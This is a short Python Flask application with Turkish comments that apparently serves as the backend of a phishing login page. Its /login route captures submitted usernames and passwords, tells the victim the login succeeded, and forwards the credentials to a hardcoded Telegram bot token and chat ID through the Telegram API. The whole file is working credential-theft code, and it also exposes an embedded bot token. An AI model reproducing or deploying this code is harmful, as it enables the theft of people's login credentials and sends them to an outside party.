from flask import Flask, request, render_template
import requests
import os

app = Flask(__name__)

# 🔹 Telegram Bilgileri
TOKEN = "8053892828:AAH9YMbrFiSchpri9wpV5FkOAevfIsaMUj4"
CHAT_ID = "7107883815"

@app.route('/')
def home():
    return render_template("index.html")

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')

    if not username or not password:
        return "Eksik bilgi!", 400

    # 📩 Telegram’a mesaj gönderme testi
    message = f"📩 Yeni Giriş Bilgisi\n👤 Kullanıcı: {username}\n🔑 Şifre: {password}"
    print(f"Gönderilecek mesaj: {message}")  # Konsola yazdıralım
    send_to_telegram(message)

    return "Giriş başarılı!"

def send_to_telegram(message):
    if TOKEN and CHAT_ID:
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        data = {"chat_id": CHAT_ID, "text": message}
        response = requests.post(url, data=data)
        
        # ✅ Telegram yanıtını log'a yazdır
        print(f"Telegram API Yanıtı: {response.json()}")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
